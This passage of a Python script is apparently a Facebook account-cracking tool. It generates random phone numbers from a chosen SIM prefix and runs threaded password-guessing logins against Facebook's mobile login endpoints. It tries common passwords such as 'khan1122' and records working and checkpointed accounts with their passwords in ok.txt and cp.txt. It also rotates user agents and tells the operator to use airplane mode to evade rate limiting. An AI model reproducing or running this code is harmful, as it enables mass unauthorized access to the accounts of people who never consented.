	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
#___________
def random_number4():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan12345','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	menu()
#_______
def random_number5():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'aliali','ali1122','i love you','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
#_____
def fcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global ugen
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': 'https://m.facebook.com/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\33[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method3():
	user=[]
	os.system('clear');print(logo)
	print('[+] Use Three Digit Code (017,018)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Cracking Has been started...(\033[1;94mBD\033[1;97m)');print(47*"-");print('	USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru]
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global syed
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mMR.HaZraToO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'mbasic.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
if __name__=='__main__':
	print('Checking Update')
	os.system("git pull")
	menu()
